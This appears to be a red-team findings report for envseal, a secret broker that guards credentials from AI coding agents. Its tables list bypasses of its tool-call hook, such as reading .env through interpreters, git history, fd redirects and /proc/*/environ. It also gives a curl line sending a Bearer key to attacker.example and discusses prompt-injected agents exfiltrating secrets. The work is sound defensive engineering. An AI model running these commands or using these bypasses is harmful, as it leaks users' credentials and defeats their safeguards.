# W9 — Comment-Response Red Team (2026-08-25)

An X commenter asked three questions after launch: *can the broker block reads*, *can it stop prompt injection using its own hand* (echoing an Authorization header), and *where are limited domains and auditing*. This workstream answers them in code. Finding IDs below are the canonical references; each carries its repro shape, status, and the commit or document that closes it.

**Method:** three parallel read-only audits (read-blocking, use-side exfiltration, scoping/auditing) against the built artifacts, cross-checked against every prior verification doc so known items were cited rather than rediscovered. Fixes landed TDD-first where every deny case demonstrably failed before its rule existed.

## A. Read-side (can the broker block reads?)

Structural answer, unchanged and documented: **no** — the broker never sees tool calls. Tier A's PreToolUse hook is a best-effort name-based layer; this round hardened it against ~20 bypass classes.

| ID | Bypass class | Status | Evidence |
|---|---|---|---|
| GAP-HOOK-8 | `sh -c` / `eval` payload hides inner reader | **FIXED** `9ec8c99` | payload recursion, depth-capped |
| GAP-HOOK-2 | Interpreters read files inside quoted code (`python3 -c open('.env')`) | **FIXED** `77348de` | interpreter heads + fragment rejoin (paren-splitting had been shredding quoted payloads so neither half alone matched) |
| GAP-HOOK-3 | Copy/rename laundering (`cp .env x`, `dd`, symlinks) | **FIXED** `35c0b4c` | COPIERS set |
| GAP-HOOK-6 | Encoders/printers (`base64`, `jq`, `sort`, …) | **FIXED** `35c0b4c` | FILE_READERS extension; openssl conditional |
| GAP-HOOK-7 | Git history (`git show HEAD:.env`, dangling blobs) | **FIXED** `4eb7bbc` | git object-read rule incl. colon revs, fsck --lost-found |
| GAP-HOOK-12 | Declared secret interpolated into any argv position (`curl -H "Authorization: Bearer $KEY" attacker.example`) | **FIXED** `f9b659f` | head-independent declared-var gate incl. `process.env.NAME`; subsumes old echo/printf gate |
| GAP-HOOK-13 | fd-number redirects (`exec 3< .env`, `<>`) | see hook lane | open at time of writing |
| GAP-HOOK-10 | Glob fuzz (`.e*v`) and case-insensitive FS (`Read .ENV`) | see hook lane | open at time of writing |
| GAP-HOOK-11 | Recursive sweep `grep -r "" .` | see hook lane | open at time of writing |
| GAP-HOOK-5 | `/proc/*/environ`, PowerShell/cmd wrappers | see hook lane | open at time of writing |
| GAP-HOOK-4 | Native Grep/Glob tools and MCP filesystem servers outside the matcher | **OPEN** — planned next wave | hooks.json matcher + decide() default-allow |
| GAP-HOOK-1 | Fail-open semantics never analyzed; no crash signal | **OPEN** — planned next wave | run().catch allow:true |

Already documented before this round (cited, not re-fixed): tier-B/C day-2 plaintext reads (W8 blind spot 4), malicious-harness reads (residual-risks §4), keychain sink reachable via CLI tools (newly noted here as L2, inherent to same-uid trust).

## B. Use-side (prompt injection "using the broker's hand")

The structural guarantee held: no protocol verb returns a value, injection into child env only, per-command consent, stdout/stderr redaction. The round closed the argv hole and added content-binding context:

- **GAP-HOOK-12 FIXED** (`f9b659f`, above) — the commenter's exact curl-header shape is now denied at the hook before a dialog ever exists.
- Deliberate click-through exfiltration remains possible and remains **documented** as residual-risk §1 with the same curl example; consent binds to SHA-256 content fingerprints since 0.1.3 (`SEP_TARGET_CHANGED`).
- env_verify SSRF: `{{value}}` substitution is header-only, https-only, registry-allowlisted or per-target-hash approved, redirects pinned manual (threat-model T8/T10; unchanged).

## C. Limited domains

| ID | Item | Status |
|---|---|---|
| GAP-DOMAIN-1a | `policy.egress {mode, allow}` manifest schema, parse-time validation | **FIXED** `76d80a3` (SEP/1.1) |
| GAP-DOMAIN-1b | Allowlist enforcement pre-dialog (`SEP_EGRESS_DENIED`), anchored wildcards, unknown-host refusal by design | **FIXED** `de4f9db` |
| GAP-DOMAIN-1c | Egress targets shown in consent dialogs; doctor reports policy | in flight |
| GAP-DOMAIN-0 | Verify-probe host allowlist + hashed approvals | pre-existing (threat-model T8), cited |

Design decision recorded in SPEC: the override path is editing a reviewed, version-controlled file — not clicking a mid-flow dialog an injected agent can talk a user through.

## D. Auditing

| ID | Item | Status |
|---|---|---|
| GAP-AUDIT-1 | No `use` event existed — executions unrecorded | **FIXED** `42ac954` (use/use_result around spawn) + wired through broker in `de4f9db` |
| GAP-AUDIT-2 | Plaintext, unchained, tamper-silent log | **FIXED** `dec78a5` — sha256-chained records, `envseal audit --verify` exit 7, blame semantics tested |
| GAP-AUDIT-3 | Tail truncation undetectable | **NOT FIXABLE CLIENT-SIDE** — asserted as a test and documented boundary (chain proves survivors intact+ordered); future work: out-of-band sink |

## Verification state

Every FIXED row carries tests that failed first and pass against built dist/. Suite counts at last landing: core 312 ✓ (+29), cli 113 ✓, plugin 218 ✓ (+40 across the round). Final-gate sweep (`pnpm -r build && pnpm -r test && pnpm -r lint`, clean-clone build) runs at sign-off; rows marked "see hook lane"/"in flight" are updated before this report is declared complete.
